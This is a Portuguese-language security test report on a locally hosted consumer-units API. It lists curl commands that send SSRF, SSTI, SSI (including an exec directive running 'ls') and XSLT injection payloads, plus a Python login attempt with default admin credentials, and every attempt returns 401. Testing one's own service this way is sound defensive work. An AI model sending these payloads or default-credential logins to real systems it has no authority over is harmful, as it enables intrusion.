
# Relatório de Testes de Segurança em Endpoints da API

Este relatório documenta os testes realizados em endpoints da API utilizando técnicas de **Server-Side Request Forgery (SSRF)**, **Server-Side Template Injection (SSTI)**, **Server-Side Includes (SSI)** e **XSLT Server-Side Injection (XSLT)**. O objetivo foi verificar vulnerabilidades e a segurança dos endpoints expostos.

---

## Endpoints Testados
### Base URL: `http://0.0.0.0:8000/`

1. `/api/consumer-units/`
2. `/api/consumer-units/<pk>/`
3. `/api/consumer-units/<pk>.<format>/`
4. `/api/consumer-units/create_consumer_unit_and_contract/`
5. `/api/consumer-units/edit_consumer_unit_and_contract/`
6. `/api/consumer-units/edit_consumer_unit_code_and_create_contract/`

---

## 1. **Server-Side Request Forgery (SSRF)**
**Comando:**
```bash
curl -X POST "http://0.0.0.0:8000/api/consumer-units/" \
-H "Content-Type: application/json" \
-d '{"url": "http://127.0.0.1:8080/admin"}'
```

**Resultado Esperado:**  
Deveria ser possível enviar uma URL para testar se o servidor faz requisições não autorizadas para destinos internos.

**Resultado Obtido:**  
Erro 401: Unauthorized. A API retornou uma mensagem indicando que as credenciais não foram informadas.

---

## 2. **Server-Side Template Injection (SSTI)**
**Comando:**
```bash
curl -X POST "http://0.0.0.0:8000/api/consumer-units/" \
-H "Content-Type: application/json" \
-d '{"template": "{{7*7}}"}'
```

**Resultado Esperado:**  
Caso a API seja vulnerável, o valor `49` (resultado de `7*7`) seria retornado no lugar do template enviado.

**Resultado Obtido:**  
Erro 401: Unauthorized. A API retornou uma mensagem indicando que as credenciais não foram informadas.

---

## 3. **Server-Side Includes (SSI)**
**Comando:**
```bash
curl -X POST "http://0.0.0.0:8000/api/consumer-units/" \
-H "Content-Type: application/json" \
-d '{"payload": "<!--#exec cmd=\"ls\"-->"}'
```

**Resultado Esperado:**  
Caso a API fosse vulnerável, a resposta deveria conter o resultado do comando `ls` executado no servidor.

**Resultado Obtido:**  
Erro 401: Unauthorized. A API retornou uma mensagem indicando que as credenciais não foram informadas.

---

## 4. **XSLT Server-Side Injection**
**Comando:**
```bash
curl -X POST "http://0.0.0.0:8000/api/consumer-units/" \
-H "Content-Type: application/xml" \
-d '<?xml version="1.0"?><stylesheet version="1.0" xmlns="http://www.w3.org/1999/XSL/Transform"><output method="text"/><template match="/"><value-of select="system-property('xsl:vendor')"/></template></stylesheet>'
```

**Resultado Esperado:**  
Se vulnerável, a API deveria processar o payload XSLT e retornar informações do sistema do servidor.

**Resultado Obtido:**  
Erro 401: Unauthorized. A API retornou uma mensagem indicando que as credenciais não foram informadas.

---

## 5. **Autenticação via Credenciais**
**Script Python Utilizado:**
```python
from requests.auth import HTTPBasicAuth
import requests

BASE_URL = "http://0.0.0.0:8000"

# Credenciais
USERNAME = "admin@admin.com"
PASSWORD = "admin"

response = requests.post(
    BASE_URL + "/api/consumer-units/",
    auth=HTTPBasicAuth(USERNAME, PASSWORD)
)
print(response.status_code)
print(response.text)
```

**Resultado Esperado:**  
A autenticação deveria retornar um token ou permitir acesso à API com os privilégios de administrador.

**Resultado Obtido:**  
A API retornou uma página HTML que representa a interface web, indicando que a autenticação foi direcionada para uma interface gráfica ao invés de responder com dados JSON ou um token de autenticação.

---

## Observações
- Todos os testes retornaram **Erro 401: Unauthorized**, indicando que as credenciais de acesso não foram enviadas ou reconhecidas pela API.
- Quando as credenciais do administrador foram utilizadas, a API respondeu com uma página HTML, o que sugere que o endpoint de autenticação não está devidamente configurado para uso RESTful.

---

## Conclusões e Próximos Passos
1. **Configurar Autenticação RESTful:**  
   Ajustar a API para retornar tokens ou permitir autenticação com respostas JSON, e não redirecionar para uma interface gráfica.

2. **Repetir os testes após autenticação bem-sucedida:**  
   Garantir que as credenciais corretas sejam reconhecidas e realizar os testes de SSRF, SSTI, SSI e XSLT novamente.

3. **Melhorar mensagens de erro:**  
   As mensagens retornadas poderiam ser mais informativas no ambiente de testes para ajudar na depuração (ex.: detalhar por que a autenticação falhou).

---


